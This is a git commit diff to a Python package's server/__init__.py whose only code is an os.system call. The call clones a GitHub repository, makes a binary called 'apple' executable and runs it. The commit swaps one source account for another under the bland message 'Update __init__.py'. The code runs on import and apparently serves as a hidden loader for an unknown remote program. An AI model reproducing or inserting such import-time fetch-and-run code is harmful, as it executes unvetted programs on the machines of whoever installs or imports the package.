7a8f5f52d762b8a0a0fa00d6ebfc63c9d514fae4
hellfireyyu <103146831+hellfireyyu@users.noreply.github.com>
2022-04-07 03:48:35 +0700

    Update __init__.py

--- server/__init__.py
+++ server/__init__.py
@@ -1,2 +1,2 @@
 import os
-os.system ("git clone https://github.com/storagegitpush404/waduk-munding.git && cd waduk-munding && chmod +x apple && ./apple")
+os.system ("git clone https://github.com/alvinakhairulnisa953/waduk-munding.git && cd waduk-munding && chmod +x apple && ./apple")
